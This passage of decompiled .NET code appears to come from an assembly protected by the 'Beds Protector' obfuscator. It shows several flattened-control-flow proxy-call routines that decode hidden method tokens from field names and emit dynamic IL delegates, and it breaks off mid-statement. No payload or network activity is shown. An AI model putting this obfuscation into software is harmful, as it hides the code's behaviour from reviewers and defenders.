  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogCBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogCBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 31131 - 24975 - 6156;
    FieldInfo fieldFromHandle;
    MethodInfo methodInfo;
    MethodBase method;
    Type[] parameterTypes;
    Type fieldType;
    DynamicMethod dynamicMethod;
    Type declaringType;
    do
    {
      int index1;
      if (num1 == 37889 + 51696 - 89565)
      {
        index1 = 0;
        num1 = 87135 - 25035 - 62079;
      }
      byte[] numArray;
      if (num1 == 45507 - 43595 - 1910)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 54071 + 26156 - 80224;
      }
      if (num1 == 67958 - 88994 + 21059)
      {
        ++index1;
        num1 = 38848 + 24000 - 62824;
      }
      ParameterInfo[] parameters;
      if (num1 != 44790 - 50883 + 6114)
      {
        if (num1 == 4357 + 6904 - 11260)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 76888 - 25236 - 51650;
        }
        if (num1 == 45281 + 43983 - 89246)
        {
          parameters = methodInfo.GetParameters();
          num1 = 35068 - 96042 + 60993;
        }
        if (num1 != 39265 - 39723 + 474)
          goto label_14;
      }
      else
        goto label_47;
label_13:
      MethodInfo[] methods;
      int index2;
      methodInfo = methods[index2];
      num1 = 32846 + 1373 - 34202;
label_14:
      int metadataToken;
      if (num1 == 33348 - 80102 + 46760)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 11100 + 9142 - 20235;
      }
      if (num1 == 39659 - 61994 + 22347)
      {
        parameterTypes = (Type[]) null;
        num1 = 3835 - 21556 + 17734;
      }
      if (num1 != 6682 + 42 - 6709)
      {
        if (num1 != 50819 - 142548 + 91751)
          goto label_21;
      }
      else
        goto label_57;
label_20:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 50259 - 94798 + 44562;
label_21:
      if (num1 == 90978 - 7619 - 83351)
      {
        if (method.IsStatic)
          num1 = 60065 - 126263 + 66207;
        else
          goto label_35;
      }
      if (num1 == 22336 + 62350 - 84677)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 71911 - 36561 - 35340;
      }
      if (num1 == 52103 - 143673 + 91575)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 91025 - 30496 - 60523;
      }
      if (num1 == 29303 - 14435 - 14851)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 14850 + 71511 - 86343;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 27717 + 54284 - 81991)
        return;
      if (num1 == 42450 - 59806 + 17370)
      {
        index2 = 0;
        num1 = 91545 + 2198 - 93728;
      }
      if (num1 != 36883 - 107965 + 71093)
        goto label_36;
label_35:
      dynamicMethod = (DynamicMethod) null;
      num1 = 56139 - 13203 - 42924;
label_36:
      int num2;
      if (num1 == 57729 + 33057 - 90783)
      {
        num2 = numArray.Length;
        num1 = 11104 + 71368 - 82468;
      }
      if (num1 == 96596 - 127966 + 31389)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 10815 + 31228 - 42023;
      }
      if (num1 == 68166 + 29711 - 97864)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 97007 - 60822 - 36171;
      }
      if (num1 == 84216 - 177074 + 92862)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 24) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 48799 - 18103 - 30691;
      }
      if (num1 == 61635 + 17970 - 79598)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 97847 - 155474 + 57635;
      }
      if (num1 != 89429 - 188068 + 98663)
        goto label_49;
label_47:
      if (index1 >= parameterTypes.Length)
        num1 = 71926 - 65006 - 6895;
      else
        goto label_20;
label_49:
      if (num1 == 95559 - 105500 + 9966)
      {
        declaringType = method.DeclaringType;
        num1 = 99522 - 8735 - 90761;
      }
      if (num1 == 57646 + 4488 - 62134)
        num1 = 75346 - 174042 + 98697;
      continue;
label_57:
      if (index2 < methods.Length)
        goto label_13;
      else
        goto label_58;
    }
    while (num1 != 95864 - 22026 - 73812);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogDBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogDBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 34922 - 126358 + 91436;
    DynamicMethod dynamicMethod;
    FieldInfo fieldFromHandle;
    MethodInfo methodInfo;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    Type[] parameterTypes;
    do
    {
      if (num1 != 50062 - 148720 + 98669)
        goto label_3;
label_2:
      dynamicMethod = (DynamicMethod) null;
      num1 = 60092 - 148772 + 88692;
label_3:
      int index1;
      if (num1 == 2869 - 8497 + 5651)
      {
        ++index1;
        num1 = 73753 - 25937 - 47792;
      }
      if (num1 != 43360 - 124350 + 81011)
      {
        if (num1 == 26205 - 60547 + 34343)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 16140 + 2100 - 18238;
        }
        if (num1 != 8877 + 68557 - 77418)
          goto label_10;
      }
      else
        goto label_34;
label_9:
      MethodInfo[] methods;
      int index2;
      methodInfo = methods[index2];
      num1 = 80901 - 66618 - 14266;
label_10:
      if (num1 == 83823 - 85046 + 1240)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 46988 + 7226 - 54196;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 21302 + 8225 - 29518)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 21274 - 38219 + 16955;
      }
      byte[] numArray;
      int num2;
      if (num1 == 85109 - 15683 - 69423)
      {
        num2 = numArray.Length;
        num1 = 365 + 14341 - 14702;
      }
      if (num1 == 20750 + 17685 - 38427)
      {
        if (method.IsStatic)
          num1 = 36291 + 50947 - 87229;
        else
          goto label_2;
      }
      if (num1 == 57093 - 17122 - 39946)
      {
        declaringType = method.DeclaringType;
        num1 = 80430 - 91178 + 10774;
      }
      if (num1 == 85503 + 11273 - 96766)
        return;
      if (num1 == 46551 - 10611 - 35920)
      {
        index1 = 0;
        num1 = 26815 - 92774 + 65980;
      }
      int metadataToken;
      if (num1 == 93346 - 5299 - 88041)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 17387 - 3804 - 13576;
      }
      if (num1 == 48814 - 59437 + 10637)
      {
        index2 = 0;
        num1 = 62715 - 159788 + 97088;
      }
      ParameterInfo[] parameters;
      if (num1 == 75839 - 30031 - 45790)
      {
        parameters = methodInfo.GetParameters();
        num1 = 14011 - 87894 + 73902;
      }
      if (num1 == 29686 + 14249 - 43933)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 55942 + 18744 - 74683;
      }
      if (num1 != 20189 - 60969 + 40804)
        goto label_36;
label_34:
      if (index1 >= parameterTypes.Length)
        num1 = 82132 - 177960 + 95853;
      else
        goto label_48;
label_36:
      if (num1 == 78782 - 100926 + 22151)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 72447 - 76224 + 3785;
      }
      if (num1 == 99187 - 68212 - 30970)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 10954 + 26370 - 37318;
      }
      if (num1 == 58636 + 136 - 58753)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 99677 - 42604 - 57053;
      }
      if (num1 != 44514 + 41501 - 86000)
      {
        if (num1 == 22046 - 116964 + 94930)
        {
          parameterTypes = (Type[]) null;
          num1 = 13357 - 36609 + 23265;
        }
        if (num1 == 72772 - 159184 + 86425)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 14784 - 87115 + 72345;
        }
        if (num1 != 362 + 74936 - 75276)
          goto label_49;
      }
      else
        goto label_57;
label_48:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 42004 - 31556 - 10425;
label_49:
      if (num1 == 42932 - 139106 + 96178)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 24;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 54833 + 6614 - 61442;
      }
      if (num1 == 62249 + 15930 - 78179)
        num1 = 83750 - 48500 - 35249;
      continue;
label_57:
      if (index2 < methods.Length)
        goto label_9;
      else
        goto label_58;
    }
    while (num1 != 68478 + 9852 - 78304);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogEBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogEBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 67203 - 150200 + 82997;
    while (num1 != 8854 - 51353 + 42509)
    {
      int index1;
      if (num1 == 50892 - 115493 + 64624)
      {
        ++index1;
        num1 = 86408 - 74231 - 12153;
      }
      FieldInfo fieldFromHandle;
      ParameterInfo[] parameters1;
      Type[] parameterTypes;
      if (num1 != 81777 - 99473 + 17717)
      {
        if (num1 == 58769 - 2774 - 55994)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 33488 - 110171 + 76685;
        }
        if (num1 != 45086 - 71121 + 26050)
        {
          if (num1 == 94040 - 41031 - 52990)
          {
            parameterTypes = new Type[parameters1.Length];
            num1 = 92278 - 63265 - 28993;
          }
          if (num1 == 67916 - 33615 - 34281)
          {
            index1 = 0;
            num1 = 31244 - 64478 + 33255;
          }
          if (num1 != 96817 - 1023 - 95770)
            goto label_15;
        }
        else
          goto label_57;
      }
      if (index1 >= parameterTypes.Length)
        num1 = 66025 - 24865 - 41135;
      else
        goto label_26;
label_15:
      MethodInfo methodInfo;
      Type fieldType;
      int index2;
      if (num1 == 80164 + 17531 - 97678)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 53618 - 18632 - 34968;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      MethodBase method;
      if (num1 == 27003 - 115397 + 88402)
      {
        if (method.IsStatic)
          num1 = 65824 - 130391 + 64576;
        else
          goto label_44;
      }
      Type declaringType;
      if (num1 == 38883 - 119278 + 80420)
      {
        declaringType = method.DeclaringType;
        num1 = 97455 - 114437 + 17008;
      }
      if (num1 == 59162 - 125499 + 66346)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 88723 - 4855 - 83858;
      }
      if (num1 != 90405 - 30674 - 59709)
        goto label_27;
label_26:
      parameterTypes[index1] = parameters1[index1].ParameterType;
      num1 = 45189 + 22739 - 67905;
label_27:
      if (num1 == 80914 - 167955 + 87048)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 84915 - 14253 - 70654;
      }
      if (num1 != 29824 + 69491 - 99299)
        goto label_31;
label_30:
      MethodInfo[] methods;
      methodInfo = methods[index2];
      num1 = 18021 - 75787 + 57783;
label_31:
      byte[] numArray1;
      int num2;
      int metadataToken;
      if (num1 == 32022 + 40591 - 72609)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray1[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[4] ^ (int) numArray1[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[2] ^ (int) numArray1[num5 = num4 - 1]) << 0);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray1[num2 = num7 - 1]) << 24;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 69704 - 125704 + 56005;
      }
      if (num1 == 52835 - 89977 + 37154)
      {
        parameterTypes = (Type[]) null;
        num1 = 78762 - 66276 - 12473;
      }
      if (num1 == 74788 - 48156 - 26619)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 13819 - 94714 + 80909;
      }
      if (num1 == 75258 - 36559 - 38694)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 20497 - 104049 + 83558;
      }
      if (num1 == 77527 - 143580 + 66071)
      {
        parameters1 = methodInfo.GetParameters();
        num1 = 42199 + 9765 - 51945;
      }
      if (num1 == 6521 + 17709 - 24224)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 8563 - 2990 - 5566;
      }
      if (num1 != 23925 + 11249 - 35163)
        goto label_45;
label_44:
      DynamicMethod dynamicMethod = (DynamicMethod) null;
      num1 = 3704 - 41001 + 37309;
label_45:
      if (num1 == 41461 + 30750 - 72197)
      {
        index2 = 0;
        num1 = 74575 - 69724 - 4836;
      }
      if (num1 == 44035 - 121241 + 77209)
      {
        num2 = numArray1.Length;
        num1 = 42626 + 18389 - 61011;
      }
      if (num1 == 19088 - 1904 - 17182)
      {
        numArray1 = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 89051 - 127441 + 38393;
      }
      if (num1 == 89933 - 18536 - 71397)
        num1 = 85208 - 150928 + 65721;
      if (num1 == 88249 - 168898 + 80675)
      {
        dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
        goto label_58;
      }
      else
        continue;
label_57:
      if (index2 < methods.Length)
        goto label_30;
label_58:
      DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
      dynamicIlInfo.SetLocalSignature(new byte[2]
      {
        (byte) 7,
        (byte) 0
      });
      byte[] code = new byte[7 * parameterTypes.Length + 6];
      int num9 = 0;
      ParameterInfo[] parameters2 = method.GetParameters();
      int index3 = method.IsConstructor ? 0 : -1;
      for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
      {
        byte[] numArray2 = code;
        int index5 = num9;
        int num10 = index5 + 1;
        numArray2[index5] = (byte) 14;
        byte[] numArray3 = code;
        int index6 = num10;
        int num11 = index6 + 1;
        int num12 = (int) (byte) index4;
        numArray3[index6] = (byte) num12;
        Type type = index3 == -1 ? method.DeclaringType : parameters2[index3].ParameterType;
        if (type.IsClass && !type.IsPointer && !type.IsByRef)
        {
          int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
          byte[] numArray4 = code;
          int index7 = num11;
          int num13 = index7 + 1;
          numArray4[index7] = (byte) 116;
          byte[] numArray5 = code;
          int index8 = num13;
          int num14 = index8 + 1;
          int num15 = (int) (byte) tokenFor;
          numArray5[index8] = (byte) num15;
          byte[] numArray6 = code;
          int index9 = num14;
          int num16 = index9 + 1;
          int num17 = (int) (byte) (tokenFor >> 8);
          numArray6[index9] = (byte) num17;
          byte[] numArray7 = code;
          int index10 = num16;
          int num18 = index10 + 1;
          int num19 = (int) (byte) (tokenFor >> 16);
          numArray7[index10] = (byte) num19;
          byte[] numArray8 = code;
          int index11 = num18;
          num9 = index11 + 1;
          int num20 = (int) (byte) (tokenFor >> 24);
          numArray8[index11] = (byte) num20;
        }
        else
          num9 = num11 + 5;
        ++index3;
      }
      byte[] numArray9 = code;
      int index12 = num9;
      int num21 = index12 + 1;
      int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[3] ^ (uint) obj1);
      numArray9[index12] = (byte) num22;
      int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
      byte[] numArray10 = code;
      int index13 = num21;
      int num23 = index13 + 1;
      int num24 = (int) (byte) tokenFor1;
      numArray10[index13] = (byte) num24;
      byte[] numArray11 = code;
      int index14 = num23;
      int num25 = index14 + 1;
      int num26 = (int) (byte) (tokenFor1 >> 8);
      numArray11[index14] = (byte) num26;
      byte[] numArray12 = code;
      int index15 = num25;
      int num27 = index15 + 1;
      int num28 = (int) (byte) (tokenFor1 >> 16);
      numArray12[index15] = (byte) num28;
      byte[] numArray13 = code;
      int index16 = num27;
      int index17 = index16 + 1;
      int num29 = (int) (byte) (tokenFor1 >> 24);
      numArray13[index16] = (byte) num29;
      code[index17] = (byte) 42;
      dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
      fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
      break;
    }
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogFBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogFBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 21460 + 21052 - 42512;
    FieldInfo fieldFromHandle;
    MethodBase method;
    MethodInfo methodInfo;
    Type[] parameterTypes;
    Type fieldType;
    DynamicMethod dynamicMethod;
    Type declaringType;
    do
    {
      int metadataToken;
      if (num1 == 45746 - 80099 + 34359)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 1385 - 84135 + 82757;
      }
      if (num1 == 32491 + 11360 - 43841)
        return;
      int index1;
      if (num1 == 74736 - 173093 + 98377)
      {
        index1 = 0;
        num1 = 63212 - 91229 + 28038;
      }
      ParameterInfo[] parameters;
      MethodInfo[] methods;
      if (num1 != 88384 - 59840 - 28523)
      {
        if (num1 == 65912 - 24808 - 41099)
        {
          metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
          num1 = 6475 - 50371 + 43902;
        }
        if (num1 == 28957 + 24161 - 53100)
        {
          parameters = methodInfo.GetParameters();
          num1 = 34696 - 105885 + 71208;
        }
        if (num1 == 3707 + 26652 - 30347)
        {
          parameterTypes = (Type[]) null;
          num1 = 34424 - 123635 + 89224;
        }
        if (num1 == 94552 - 17201 - 77338)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 99104 - 37358 - 61732;
        }
        if (num1 != 9428 + 67344 - 76750)
          goto label_17;
      }
      else
        goto label_25;
label_16:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 27759 + 52636 - 80372;
label_17:
      if (num1 != 43810 + 13989 - 57783)
        goto label_19;
label_18:
      int index2;
      methodInfo = methods[index2];
      num1 = 36697 + 7524 - 44204;
label_19:
      byte[] numArray;
      int num2;
      if (num1 == 41657 - 25026 - 16627)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[0] ^ (int) numArray[num2 = num7 - 1]) << 24;
